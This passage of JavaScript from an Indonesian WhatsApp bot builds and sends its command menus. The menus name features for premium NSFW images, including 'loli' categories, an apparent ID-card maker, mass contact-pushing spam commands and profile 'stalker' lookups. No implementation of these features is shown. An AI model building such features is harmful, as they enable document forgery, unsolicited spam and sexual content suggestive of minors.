│ ‣ ${prefix}artimimpi
│ ‣ ${prefix}artinama
│ ‣ ${prefix}ramaljodoh
│ ‣ ${prefix}ramaljodohbali
│ ‣ ${prefix}suamiistri
│ ‣ ${prefix}ramalcinta
│ ‣ ${prefix}cocoknama
│ ‣ ${prefix}pasangan
│ ‣ ${prefix}jadiannikah
│ ‣ ${prefix}sifatusaha
│ ‣ ${prefix}rezeki
│ ‣ ${prefix}pekerjaan
│ ‣ ${prefix}ramalnasib
│ ‣ ${prefix}penyakit
│ ‣ ${prefix}tarot
│ ‣ ${prefix}fengshui
│ ‣ ${prefix}haribaik
│ ‣ ${prefix}harisangar
│ ‣ ${prefix}harisial
│ ‣ ${prefix}nagahari
│ ‣ ${prefix}arahrezeki
│ ‣ ${prefix}peruntungan
│ ‣ ${prefix}weton
│ ‣ ${prefix}karakter
│ ‣ ${prefix}keberuntungan
│ ‣ ${prefix}memancing
│ ‣ ${prefix}masasubur
│ ‣ ${prefix}zodiak
│ ‣ ${prefix}shio
└──···

▧ 「 *G R O U P* 」
│ ‣ ${prefix}kick
│ ‣ ${prefix}add
│ ‣ ${prefix}culik
│ ‣ ${prefix}promote
│ ‣ ${prefix}demote
│ ‣ ${prefix}setname
│ ‣ ${prefix}setdesc
│ ‣ ${prefix}setppgc
│ ‣ ${prefix}tagall
│ ‣ ${prefix}hidetag
│ ‣ ${prefix}totag
│ ‣ ${prefix}antilink
│ ‣ ${prefix}antilinkv2
│ ‣ ${prefix}antilinkyt
│ ‣ ${prefix}antilinktt
│ ‣ ${prefix}antipanel
│ ‣ ${prefix}mutegc
│ ‣ ${prefix}ephemeral
│ ‣ ${prefix}group
│ ‣ ${prefix}editinfo
│ ‣ ${prefix}linkgc
│ ‣ ${prefix}revoke
│ ‣ ${prefix}liston
└──···

▧ 「 *D A T A* 」
│ ‣ ${prefix}setcmd [reply sticker/pesan]
│ ‣ ${prefix}listcmd
│ ‣ ${prefix}delcmd [reply sticker/pesan]
│ ‣ ${prefix}lockcmd
│ ‣ ${prefix}addmsg
│ ‣ ${prefix}listmsg
│ ‣ ${prefix}getmsg
│ ‣ ${prefix}delmsg
└──···

▧ 「 *N S F W  P R E M I U M* 」
│ ‣ ${prefix}ahegao
│ ‣ ${prefix}cum
│ ‣ ${prefix}panties
│ ‣ ${prefix}bdsm
│ ‣ ${prefix}tits
│ ‣ ${prefix}milf
│ ‣ ${prefix}yuri
│ ‣ ${prefix}lewd
│ ‣ ${prefix}ero
│ ‣ ${prefix}armpits
│ ‣ ${prefix}feets
│ ‣ ${prefix}ecchi
│ ‣ ${prefix}neko2
│ ‣ ${prefix}loli2
│ ‣ ${prefix}pussy
│ ‣ ${prefix}cum_jpg
│ ‣ ${prefix}blowjob
│ ‣ ${prefix}lewdk
└──···

▧ 「 *R A M D O N* 」
│ ‣ ${prefix}pokemon
│ ‣ ${prefix}rize
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}aesthetic
│ ‣ ${prefix}anjing
│ ‣ ${prefix}blankpink
│ ‣ ${prefix}boneka
│ ‣ ${prefix}hekel
│ ‣ ${prefix}justina
│ ‣ ${prefix}kpop
│ ‣ ${prefix}kucing
│ ‣ ${prefix}mobil
│ ‣ ${prefix}motor
│ ‣ ${prefix}pubg
│ ‣ ${prefix}rose
│ ‣ ${prefix}ryujin
│ ‣ ${prefix}wallhp
│ ‣ ${prefix}cyberspace
│ ‣ ${prefix}mountain
│ ‣ ${prefix}programming
│ ‣ ${prefix}technology 
│ ‣ ${prefix}couple
└──···

▧ 「 *A S U P A N* 」
│ ‣ ${prefix}cecan
│ ‣ ${prefix}china
│ ‣ ${prefix}cogan
│ ‣ ${prefix}indonesia
│ ‣ ${prefix}japan
│ ‣ ${prefix}korea
│ ‣ ${prefix}malaysia
│ ‣ ${prefix}thailand
│ ‣ ${prefix}vietnam
└──···

▧ 「 *T O O L S* 」
│ ‣ ${prefix}style
│ ‣ ${prefix}delete
│ ‣ ${prefix}quoted
│ ‣ ${prefix}ebinary
│ ‣ ${prefix}dbinary
│ ‣ ${prefix}wikimedia
│ ‣ ${prefix}bass
│ ‣ ${prefix}blown
│ ‣ ${prefix}deep
│ ‣ ${prefix}earrape
│ ‣ ${prefix}fast
│ ‣ ${prefix}fat
│ ‣ ${prefix}nightcore
│ ‣ ${prefix}reverse
│ ‣ ${prefix}robot
│ ‣ ${prefix}slow
│ ‣ ${prefix}tupai
└──···

▧ 「 *C R E A T O R  I M A G E* 」
│ ‣ ${prefix}tololsertifikat *<text>*
│ ‣ ${prefix}bucinsertifikat *<text>*
│ ‣ ${prefix}pacarsertifikat *<text>*
│ ‣ ${prefix}ttp *<text>*
│ ‣ ${prefix}attp *<text>*
│ ‣ ${prefix}attp2 *<text>*
│ ‣ ${prefix}qcimg *<text>*
│ ‣ ${prefix}qc *<text>*
└──···

▧ 「 *I S L A M* 」
│ ‣ ${prefix}asmaulhusna
│ ‣ ${prefix}alquranaudio
│ ‣ ${prefix}alquran
│ ‣ ${prefix}jadwalsolat
│ ‣ ${prefix}kisahnabi
│ ‣ ${prefix}listsurah
│ ‣ ${prefix}iqro
│ ‣ ${prefix}juzamma
│ ‣ ${prefix}hadist
│ ‣ ${prefix}tasfirsurah
└──···

▧ 「 *D O W N L O A D* 」
│ ‣ ${prefix}ytplay
│ ‣ ${prefix}ytmp3
│ ‣ ${prefix}ytmp4
│ ‣ ${prefix}igdl
│ ‣ ${prefix}igdl2
│ ‣ ${prefix}tiktok
│ ‣ ${prefix}tiktokaudio
│ ‣ ${prefix}twtdl
│ ‣ ${prefix}fbdl
│ ‣ ${prefix}gitclone
└──···

▧ 「 *E P H O T O _1_* 」
│ ‣ ${prefix}wetglass *<text>*
│ ‣ ${prefix}multicolor3d *<text>*
│ ‣ ${prefix}watercolor *<text>*
│ ‣ ${prefix}luxurygold *<text>*
│ ‣ ${prefix}galaxywallpaper *<text>*
│ ‣ ${prefix}lighttext *<text>*
│ ‣ ${prefix}beautifulflower *<text>*
│ ‣ ${prefix}puppycute *<text>*
│ ‣ ${prefix}royaltext *<text>*
│ ‣ ${prefix}heartshaped *<text>*
│ ‣ ${prefix}birthdaycake *<text>*
│ ‣ ${prefix}galaxystyle *<text>*
│ ‣ ${prefix}hologram3d *<text>*
│ ‣ ${prefix}greenneon *<text>*
│ ‣ ${prefix}glossychrome *<text>*
│ ‣ ${prefix}greenbush *<text>*
│ ‣ ${prefix}metallogo *<text>*
│ ‣ ${prefix}noeltext *<text>*
│ ‣ ${prefix}glittergold *<text>*
│ ‣ ${prefix}textcake *<text>*
│ ‣ ${prefix}starsnight *<text>*
│ ‣ ${prefix}wooden3d *<text>*
│ ‣ ${prefix}textbyname *<text>*
│ ‣ ${prefix}writegalacy *<text>*
│ ‣ ${prefix}galaxybat *<text>*
│ ‣ ${prefix}snow3d *<text>*
│ ‣ ${prefix}birthdayday *<text>*
│ ‣ ${prefix}goldplaybutton *<text>*
│ ‣ ${prefix}silverplaybutton *<text>*
│ ‣ ${prefix}freefire *<text>*
└──···

▧ 「 *P H O T O  O X Y _1_* 」
│ ‣ ${prefix}shadow *<text>*
│ ‣ ${prefix}cup *<text>*
│ ‣ ${prefix}cup1 *<text>*
│ ‣ ${prefix}romance *<text>*
│ ‣ ${prefix}smoke *<text>*
│ ‣ ${prefix}burnpaper *<text>*
│ ‣ ${prefix}lovemessage *<text>*
│ ‣ ${prefix}undergrass *<text>*
│ ‣ ${prefix}love *<text>*
│ ‣ ${prefix}coffe *<text>*
│ ‣ ${prefix}woodheart *<text>*
│ ‣ ${prefix}woodenboard *<text>*
│ ‣ ${prefix}summer3d *<text>*
│ ‣ ${prefix}wolfmetal *<text>*
│ ‣ ${prefix}nature3d *<text>*
│ ‣ ${prefix}underwater *<text>*
│ ‣ ${prefix}golderrose *<text>*
│ ‣ ${prefix}summernature *<text>*
│ ‣ ${prefix}letterleaves *<text>*
│ ‣ ${prefix}glowingneon *<text>*
│ ‣ ${prefix}fallleaves *<text>*
│ ‣ ${prefix}flamming *<text>*
│ ‣ ${prefix}harrypotter *<text>*
│ ‣ ${prefix}carvedwood *<text>*
└──···

▧ 「 *T E X T  P R O _1_* 」
│ ‣ ${prefix}blackpink *<text>*
│ ‣ ${prefix}neon *<text>*
│ ‣ ${prefix}greenneon *<text>*
│ ‣ ${prefix}advanceglow *<text>*
│ ‣ ${prefix}futureneon *<text>*
│ ‣ ${prefix}sandwriting *<text>*
│ ‣ ${prefix}sandsummer *<text>*
│ ‣ ${prefix}sandengraved *<text>*
│ ‣ ${prefix}metaldark *<text>*
│ ‣ ${prefix}neonlight *<text>*
│ ‣ ${prefix}holographic *<text>*
│ ‣ ${prefix}text1917 *<text>*
│ ‣ ${prefix}minion *<text>*
│ ‣ ${prefix}deluxesilver *<text>*
│ ‣ ${prefix}newyearcard *<text>*
│ ‣ ${prefix}bloodfrosted *<text>*
│ ‣ ${prefix}halloween *<text>*
│ ‣ ${prefix}jokerlogo *<text>*
│ ‣ ${prefix}fireworksparkle *<text>*
│ ‣ ${prefix}natureleaves *<text>*
│ ‣ ${prefix}bokeh *<text>*
│ ‣ ${prefix}toxic *<text>*
│ ‣ ${prefix}strawberry *<text>*
│ ‣ ${prefix}box3d *<text>*
│ ‣ ${prefix}roadwarning *<text>*
│ ‣ ${prefix}breakwall *<text>*
│ ‣ ${prefix}icecold *<text>*
│ ‣ ${prefix}luxury *<text>*
│ ‣ ${prefix}cloud *<text>*
│ ‣ ${prefix}summersand *<text>*
│ ‣ ${prefix}horrorblood *<text>*
│ ‣ ${prefix}thunder *<text>*
└──···

▧ 「 *T E X T  P R O _2_* 」
│ ‣ ${prefix}pornhub *<text>*
│ ‣ ${prefix}glitch *<text>*
│ ‣ ${prefix}avenger *<text>*
│ ‣ ${prefix}space *<text>*
│ ‣ ${prefix}ninjalogo *<text>*
│ ‣ ${prefix}marvelstudio *<text>*
│ ‣ ${prefix}lionlogo *<text>*
│ ‣ ${prefix}wolflogo *<text>*
│ ‣ ${prefix}steel3d *<text>*
│ ‣ ${prefix}wallgravity *<text>*
└──···

▧ 「 *I N F O R M A T I O N* 」
│ ‣ ${prefix}kbbi
│ ‣ ${prefix}brainly
│ ‣ ${prefix}roboguru
│ ‣ ${prefix}jarak
│ ‣ ${prefix}wikipedia
│ ‣ ${prefix}translate
│ ‣ ${prefix}jadwaltv
│ ‣ ${prefix}jadwaltvnow
│ ‣ ${prefix}jadwalbola
│ ‣ ${prefix}newsinfo
│ ‣ ${prefix}cnnindonesia
│ ‣ ${prefix}cnnnasional
│ ‣ ${prefix}cnninternasional
│ ‣ ${prefix}infogempa
│ ‣ ${prefix}infocuaca
│ ‣ ${prefix}lirik
│ ‣ ${prefix}kodepos
│ ‣ ${prefix}infochat
│ ‣ ${prefix}google
│ ‣ ${prefix}pinterest
└──···

▧ 「 *A I* 」
│ ‣ ${prefix}ai *<text>*
└──···

▧ 「 *A N I M E* 」
│ ‣ ${prefix}cosplay
│ ‣ ${prefix}genshin
│ ‣ ${prefix}yotsuba
│ ‣ ${prefix}shinomiya
│ ‣ ${prefix}yumeko
│ ‣ ${prefix}tejina
│ ‣ ${prefix}chiho
│ ‣ ${prefix}boruto
│ ‣ ${prefix}kaori
│ ‣ ${prefix}shizuka
│ ‣ ${prefix}kaga
│ ‣ ${prefix}gremory
│ ‣ ${prefix}kagura
│ ‣ ${prefix}hinata
│ ‣ ${prefix}minato
│ ‣ ${prefix}naruto
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}anna
│ ‣ ${prefix}deidara
│ ‣ ${prefix}yuki
│ ‣ ${prefix}asuna
│ ‣ ${prefix}chitoge
│ ‣ ${prefix}emilia
│ ‣ ${prefix}inori
│ ‣ ${prefix}madara
│ ‣ ${prefix}sasuke
│ ‣ ${prefix}one piece
│ ‣ ${prefix}kotori
│ ‣ ${prefix}mikasa
│ ‣ ${prefix}akiyama
│ ‣ ${prefix}shine
│ ‣ ${prefix}shinka
│ ‣ ${prefix}elaina
│ ‣ ${prefix}nezuko
│ ‣ ${prefix}rize
│ ‣ ${prefix}anna
│ ‣ ${prefix}ayuzawa
│ ‣ ${prefix}hestia
│ ‣ ${prefix}Itachi
│ ‣ ${prefix}sakura
│ ‣ ${prefix}tsunade
│ ‣ ${prefix}kencki
│ ‣ ${prefix}toukachan
│ ‣ ${prefix}akira
│ ‣ ${prefix}itori
│ ‣ ${prefix}kurumi
│ ‣ ${prefix}miku
│ ‣ ${prefix}pokemon
└──···

▧ 「 *C O N V E R T* 」
│ ‣ ${prefix}stiker
│ ‣ ${prefix}swm
│ ‣ ${prefix}smeme
│ ‣ ${prefix}emojimix
│ ‣ ${prefix}emojimix2
│ ‣ ${prefix}toimage
│ ‣ ${prefix}tomp4
│ ‣ ${prefix}toaudio
│ ‣ ${prefix}tomp3
│ ‣ ${prefix}tovn
│ ‣ ${prefix}togif
└──···

▧ 「 *S T A L K E R* 」
│ ‣ ${prefix}enka
│ ‣ ${prefix}igstalk
│ ‣ ${prefix}ttstalk
│ ‣ ${prefix}mlstalk
│ ‣ ${prefix}ghstalk
│ ‣ ${prefix}twstalk
└──···

▧ 「 *S O U N D* 」
│ ‣ ${prefix}sound1
│ ‣ ${prefix}sound2
│ ‣ ${prefix}sound3
│ ‣ ${prefix}sound4
│ ‣ ${prefix}sound5
│ ‣ ${prefix}sound6
│ ‣ ${prefix}sound7
│ ‣ ${prefix}sound8
│ ‣ ${prefix}sound9
│ ‣ ${prefix}sound10
│ ‣ ${prefix}sound11
│ ‣ ${prefix}sound12
│ ‣ ${prefix}sound13
│ ‣ ${prefix}sound14
│ ‣ ${prefix}sound15
│ ‣ ${prefix}sound16
│ ‣ ${prefix}sound17
│ ‣ ${prefix}sound18
│ ‣ ${prefix}sound19
│ ‣ ${prefix}sound20
│ ‣ ${prefix}sound21
│ ‣ ${prefix}sound22
│ ‣ ${prefix}sound23
│ ‣ ${prefix}sound24
│ ‣ ${prefix}sound25
│ ‣ ${prefix}sound26
│ ‣ ${prefix}sound27
│ ‣ ${prefix}sound28
│ ‣ ${prefix}sound29
│ ‣ ${prefix}sound30
│ ‣ ${prefix}sound31
│ ‣ ${prefix}sound32
│ ‣ ${prefix}sound33
│ ‣ ${prefix}sound34
│ ‣ ${prefix}sound35
│ ‣ ${prefix}sound36
│ ‣ ${prefix}sound37
│ ‣ ${prefix}sound38
│ ‣ ${prefix}sound39
│ ‣ ${prefix}sound40
│ ‣ ${prefix}sound41
│ ‣ ${prefix}sound42
│ ‣ ${prefix}sound43
│ ‣ ${prefix}sound44
│ ‣ ${prefix}sound45
│ ‣ ${prefix}sound46
│ ‣ ${prefix}sound47
│ ‣ ${prefix}sound48
│ ‣ ${prefix}sound49
│ ‣ ${prefix}sound50
│ ‣ ${prefix}sound51
│ ‣ ${prefix}sound52
│ ‣ ${prefix}sound53
│ ‣ ${prefix}sound54
│ ‣ ${prefix}sound55
│ ‣ ${prefix}sound56
│ ‣ ${prefix}sound57
│ ‣ ${prefix}sound58
│ ‣ ${prefix}sound59
│ ‣ ${prefix}sound60
│ ‣ ${prefix}sound61
│ ‣ ${prefix}sound62
│ ‣ ${prefix}sound63
│ ‣ ${prefix}sound64
│ ‣ ${prefix}sound65
│ ‣ ${prefix}sound66
│ ‣ ${prefix}sound67
│ ‣ ${prefix}sound68
│ ‣ ${prefix}sound69
│ ‣ ${prefix}sound70
│ ‣ ${prefix}sound71
│ ‣ ${prefix}sound72
│ ‣ ${prefix}sound73
│ ‣ ${prefix}sound74
│ ‣ ${prefix}sound75
│ ‣ ${prefix}sound76
│ ‣ ${prefix}sound77
│ ‣ ${prefix}sound78
│ ‣ ${prefix}sound79
│ ‣ ${prefix}sound80
│ ‣ ${prefix}sound81
│ ‣ ${prefix}sound82
│ ‣ ${prefix}sound83
│ ‣ ${prefix}sound84
│ ‣ ${prefix}sound85
│ ‣ ${prefix}sound86
│ ‣ ${prefix}sound87
│ ‣ ${prefix}sound88
│ ‣ ${prefix}sound89
│ ‣ ${prefix}sound90
│ ‣ ${prefix}sound91
│ ‣ ${prefix}sound92
│ ‣ ${prefix}sound93
│ ‣ ${prefix}sound94
│ ‣ ${prefix}sound95
│ ‣ ${prefix}sound96
│ ‣ ${prefix}sound97
│ ‣ ${prefix}sound98
│ ‣ ${prefix}sound99
│ ‣ ${prefix}sound100
│ ‣ ${prefix}sound101
│ ‣ ${prefix}sound102
│ ‣ ${prefix}sound103
│ ‣ ${prefix}sound104
│ ‣ ${prefix}sound105
│ ‣ ${prefix}sound106
│ ‣ ${prefix}sound107
│ ‣ ${prefix}sound108
│ ‣ ${prefix}sound109
│ ‣ ${prefix}sound110
│ ‣ ${prefix}sound111
│ ‣ ${prefix}sound112
│ ‣ ${prefix}sound113
│ ‣ ${prefix}sound114
│ ‣ ${prefix}sound115
│ ‣ ${prefix}sound116
│ ‣ ${prefix}sound117
│ ‣ ${prefix}sound118
│ ‣ ${prefix}sound119
│ ‣ ${prefix}sound120
│ ‣ ${prefix}sound121
│ ‣ ${prefix}sound122
│ ‣ ${prefix}sound123
│ ‣ ${prefix}sound124
│ ‣ ${prefix}sound125
│ ‣ ${prefix}sound126
│ ‣ ${prefix}sound127
│ ‣ ${prefix}sound128
│ ‣ ${prefix}sound129
│ ‣ ${prefix}sound130
│ ‣ ${prefix}sound131
│ ‣ ${prefix}sound132
│ ‣ ${prefix}sound133
│ ‣ ${prefix}sound134
│ ‣ ${prefix}sound135
│ ‣ ${prefix}sound136
│ ‣ ${prefix}sound137
│ ‣ ${prefix}sound138
│ ‣ ${prefix}sound139
│ ‣ ${prefix}sound140
│ ‣ ${prefix}sound141
│ ‣ ${prefix}sound142
│ ‣ ${prefix}sound143
│ ‣ ${prefix}sound144
│ ‣ ${prefix}sound145
│ ‣ ${prefix}sound146
│ ‣ ${prefix}sound147
│ ‣ ${prefix}sound148
│ ‣ ${prefix}sound149
│ ‣ ${prefix}sound150
│ ‣ ${prefix}sound151
│ ‣ ${prefix}sound152
│ ‣ ${prefix}sound153
│ ‣ ${prefix}sound154
│ ‣ ${prefix}sound155
│ ‣ ${prefix}sound156
│ ‣ ${prefix}sound157
│ ‣ ${prefix}sound158
│ ‣ ${prefix}sound159
│ ‣ ${prefix}sound160
│ ‣ ${prefix}sound161
└──···

▧ 「 *M E M E* 」
│ ‣ ${prefix}darkjoke
│ ‣ ${prefix}memeindo
└──···

▧ 「 *KATA-KATA* 」
│ ‣ ${prefix}katabijak
│ ‣ ${prefix}bucin
│ ‣ ${prefix}bucin2
│ ‣ ${prefix}quotesislami
│ ‣ ${prefix}puisi
│ ‣ ${prefix}quotesdilan
│ ‣ ${prefix}namarandom
└──···

▧––『 Panel Menu 』
│ ‣${prefix}1gb 🅞
│ ‣${prefix}2gb 🅞
│ ‣${prefix}3gb 🅞
│ ‣${prefix}4gb 🅞
│ ‣${prefix}5gb 🅞
│ ‣${prefix}6gb 🅞
│ ‣${prefix}7gb 🅞
│ ‣${prefix}8gb 🅞
│ ‣${prefix}9gb 🅞
│ ‣${prefix}unli 🅞
│ ‣${prefix}createadmin 🅞
│ ‣${prefix}addseler
│ ‣${prefix}delusr
│ ‣${prefix}delsrv
│ ‣${prefix}listseler
╰–––––––––––––––༓
╭––『 PushKontak Menu 』
│ ‣${prefix}pushkontakv1 idgc|pesan
│ ‣${prefix}pushkontakv2 [text]
│ ‣${prefix}pushmember1 [text]
│ ‣${prefix}pushmember2 [text]
│ ‣${prefix}listidgc
│ ‣${prefix}idgroup
╰–––––––––––––––༓`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'ownermenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *O W N E R* 」
│ ‣ ${prefix}listpc
│ ‣ ${prefix}listgc
│ ‣ ${prefix}public
│ ‣ ${prefix}self
│ ‣ ${prefix}enc
│ ‣ ${prefix}pushkontak
│ ‣ ${prefix}bcgc
│ ‣ ${prefix}bc
│ ‣ ${prefix}lockcmd
│ ‣ ${prefix}addprem
│ ‣ ${prefix}delprem
│ ‣ ${prefix}addlimit
│ ‣ ${prefix}dellimit
│ ‣ ${prefix}addvn
│ ‣ ${prefix}delvn
│ ‣ ${prefix}myip
│ ‣ ${prefix}chat
│ ‣ ${prefix}react
│ ‣ ${prefix}shutdown
│ ‣ ${prefix}join
│ ‣ ${prefix}leave
│ ‣ ${prefix}setexif
│ ‣ ${prefix}setppbot
│ ‣ ${prefix}setppbot full
│ ‣ ${prefix}setnamabot
│ ‣ ${prefix}setbiobot
│ ‣ ${prefix}block
│ ‣ ${prefix}unblock
│ ‣ ${prefix}ambilsesi
│ ‣ ${prefix}ambilcase
│ ‣ ${prefix}autoread
│ ‣ ${prefix}cekapikey
│ ‣ ${prefix}autobio
│ ‣  >
│ ‣  =>
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu1.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

case 'funmenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *F U N* 」
│ ‣ ${prefix}apakah
│ ‣ ${prefix}bisakah
│ ‣ ${prefix}bagaimanakah
│ ‣ ${prefix}rate
│ ‣ ${prefix}gantengcek
│ ‣ ${prefix}cekganteng
│ ‣ ${prefix}cantikcek
│ ‣ ${prefix}cekcantik
│ ‣ ${prefix}sangecek
│ ‣ ${prefix}ceksange
│ ‣ ${prefix}gaycek
│ ‣ ${prefix}cekgay
│ ‣ ${prefix}lesbicek
│ ‣ ${prefix}ceklesbi
│ ‣ ${prefix}kapankah
│ ‣ ${prefix}wangy
│ ‣ ${prefix}cekmati
│ ‣ ${prefix}halah
│ ‣ ${prefix}hilih
│ ‣ ${prefix}huluh
│ ‣ ${prefix}heleh
│ ‣ ${prefix}holoh
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu2.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

case 'mainmenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *M A I N* 」
│ ‣ ${prefix}owner
│ ‣ ${prefix}ping
│ ‣ ${prefix}menu
│ ‣ ${prefix}speedtest
│ ‣ ${prefix}runtime
│ ‣ ${prefix}ceklimit
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu3.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

case 'premmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *P R E M I U M* 」
│ ‣ ${prefix}ktpmaker
│ ‣ ${prefix}art
│ ‣ ${prefix}loli
│ ‣ ${prefix}neko
│ ‣ ${prefix}waifu
│ ‣ ${prefix}waifu2
│ ‣ ${prefix}shota
│ ‣ ${prefix}husbu
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}shinobu
│ ‣ ${prefix}wallnime
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu4.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

case 'primbonmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *P R I M B O N* 」
│ ‣ ${prefix}nomorhoki
│ ‣ ${prefix}artimimpi
│ ‣ ${prefix}artinama
│ ‣ ${prefix}ramaljodoh
